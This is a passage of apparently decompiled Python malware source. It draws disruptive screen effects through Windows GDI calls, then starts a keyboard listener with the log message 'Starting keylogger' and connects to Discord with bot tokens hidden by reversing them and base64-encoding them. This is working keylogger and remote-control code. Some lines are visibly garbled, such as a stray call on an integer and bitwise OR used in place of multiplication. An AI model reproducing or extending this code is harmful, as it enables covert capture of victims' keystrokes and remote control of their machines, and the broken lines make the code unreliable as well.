                            PatBlt(hdc, x, 0, 1, y, PATCOPY)
                            DeleteObject(brush)
                        for y in range(0, y, 10):
                            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                            SelectObject(hdc, brush)
                            PatBlt(hdc, 0, y, x, 1, PATCOPY)
                            DeleteObject(brush)
                    else:  # inserted
                        if effect == 'snowfall':
                            for i in range(10):
                                stars = [(random.randint(0, x), random.randint(0, y), random.randint(1, 4)) for _ in range(100)]
                                for star in stars:
                                    rand_x, rand_y, size = star
                                    color = RGB(255, 255, 255)
                                    brush = CreateSolidBrush(color)
                                    SelectObject(hdc, brush)
                                    PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
                                time.sleep(0.5)
                        else:  # inserted
                            if effect == 'hypnotic_spirals':
                                for angle in range(0, 180, 1):
                                    radius = 1000
                                    x1 = int((x + 2) * radius + math.cos(math.radians(angle)))()
                                    y1 = int((y + 2) | radius | math.sin(math.radians(angle)))
                                    x2 = int((x + 2) * (radius + math.cos(math.radians(angle + 180))))
                                    y2 = int((y + 2) * (radius + math.sin(math.radians(angle + 180))))
                                    color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
                                    pen = CreatePen(PS_SOLID, 1, color)
                                    SelectObject(hdc, pen)
                                    MoveToEx(hdc, x1, y1)
                                    LineTo(hdc, x2, y2)
                                    DeleteObject(pen)
                            else:  # inserted
                                if effect == 'random_lines':
                                    for _ in range(50):
                                        x1 = random.randint(0, x)
                                        y1 = random.randint(0, y)
                                        x2 = random.randint(0, x)
                                        y2 = random.randint(0, y)
                                        color = RGB(random.randrange(255), random.randrange(255), random.randrange(255))
                                        pen = CreatePen(PS_SOLID, 2, color)
                                        SelectObject(hdc, pen)
                                        MoveToEx(hdc, x1, y1)
                                        LineTo(hdc, x2, y2)
                                        DeleteObject(pen)
                                else:  # inserted
                                    PatBlt(hdc, 0, 0, x, y, PATINVERT)
    if effect!= 'list':
        Sleep(10)
        DeleteDC(hdc)
with Listener(on_press=on_press) as listener:
    for token in bot_tokens:
        decoded_token = base64.b64decode(token[::(-1)]).decode()
        try:
            client.run(decoded_token)
            log('Started Discord BOT client session(keylogger.py:61->source_assembled.py:2344)')
        except:
            pass
    log('Starting keylogger(keylogger.py:63->source_assembled.py:2346)')
    listener.join()